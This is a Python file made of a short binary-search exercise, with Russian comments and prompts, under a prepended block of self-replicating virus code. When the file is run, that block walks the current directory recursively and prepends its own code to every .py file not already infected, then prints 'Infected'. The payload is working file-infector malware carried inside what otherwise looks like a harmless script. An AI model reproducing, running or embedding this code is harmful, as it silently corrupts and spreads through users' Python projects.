
#STARTED#
import sys, os
def virus(python):
    begin = "#STARTED#\n"
    end = "#STOPPED#\n"
    with open(sys.argv[0], "r") as copy:
        k = 0
        virus_code = "\n"
        for line in copy:
            if line == begin:
                k = 1
                virus_code += begin
            elif k == 1 and line != end:
                virus_code += line
            elif line == end:
                virus_code += end
                break
            else:
                pass
    with open(python, "r") as file:
        origin_code = ""
        for line in file:
            origin_code += line
            if line == begin:
                Virus = True
                break
            else:
                Virus = False
    if Virus == False:
        with open(python, "w") as paste:
            paste.write(virus_code +"\n\n" + origin_code)
    else:
        pass

def code(void):
    print("Infected")

code(None)
def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):
            if os.path.splitext(path)[1] == ".py":
                virus(path)
            else:
                pass
        else:
            walk(path)
walk(os.getcwd())
#STOPPED#

#Бинарный поиск
a = int(input("Введите число которое надо найти: "))
max = 10000
min = 0
count = 0
finish = True
while finish:
    sred = (max + min) // 2
    if a < sred:
        max = sred
        count += 1
    elif a > sred:
        min = sred
        count += 1
    elif sred == a:
        count += 1
        finish = False
print(count)